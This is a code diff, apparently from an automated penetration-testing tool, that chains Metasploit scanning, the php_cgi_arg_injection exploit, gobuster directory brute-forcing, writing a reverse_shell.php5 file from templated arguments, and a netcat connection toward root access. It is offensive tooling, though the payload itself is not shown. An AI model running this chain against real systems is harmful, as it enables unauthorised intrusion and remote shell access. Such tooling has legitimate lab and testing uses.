@@ -6,8 +6,7 @@ import re
 Default = False
 
 class Function():
-        
-    def http_version(func_in, Data):
+    def http_version(func_in, Data, args, block_In):
         # - msfconsole
         # - wait for 15s (msfconsole opening)
         # - use auxiliary/scanner/http/http_version
@@ -39,7 +38,7 @@ class Function():
         return Data, match
             
 
-    def php_cgi_arg_injection(func_in, Data):
+    def php_cgi_arg_injection(func_in, Data, args, block_In):
         # use exploit/multi/http/php_cgi_arg_injection
         # - set RHOSTS {IP}
         # - run
@@ -61,7 +60,7 @@ class Function():
         
         return Data, match
 
-    def metasploit(func_in, Data, args):
+    def metasploit(func_in, Data, args, block_In):
         match = Default # set default first
         script_name = ""
         for arg in args:
@@ -103,33 +102,44 @@ class Function():
 
         return Data, match 
         
-    def print_something(func_in, Data):
+    def print_something(func_in, Data, args, block_In):
         match = Default
         print("class chain is running~~")
         return Data, match
 
-    def gobuster(func_in, Data):
+    def gobuster(func_in, Data, args, block_In):
         match = Default
-
-        # proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
-        # for stdout_line in iter(proc.stdout.readline, b''):
-        #     # code below just for getting apache version
-        #     outputLine = stdout_line.decode('utf-8').rstrip()
-        #     if re.search("/panel", outputLine)!=None:
-        #         match = True
-        #     print(outputLine)
-        os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
+        proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
+        for stdout_line in iter(proc.stdout.readline, b''):
+            # code below just for getting apache version
+            outputLine = stdout_line.decode('utf-8').rstrip()
+            print(outputLine)
+            if re.search("/panel", outputLine)!=None:
+                match = True
+                return Data, match
+        # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
         return Data, match
 
-    def upload_file(func_in, Data):
-        match = Default
+    def create_file(func_in, Data, args, block_In):
+
+        match = Default        
+        try:
+            with open('/home/kali/Desktop/reverse_shell.php5', 'w') as f:
+                file = args[0]
+                for i in range(len(args)):
+                    file = file.replace("REPLACE_IT", Data[block_In[i]])
+                f.write(file)
+        except FileNotFoundError:
+            print('Fail to create a file on path:/home/kali/Desktop/')
+        
+        
         return Data, match
 
-    def netcat(func_in, Data):
+    def netcat(func_in, Data, args, block_In):
         match = Default
         os.system(f"nc {Data['argument']} {func_in['port']}")
         return Data, match
 
-    def get_root(func_in, Data):
+    def get_root(func_in, Data, args, block_In):
         match = Default
         return Data, match
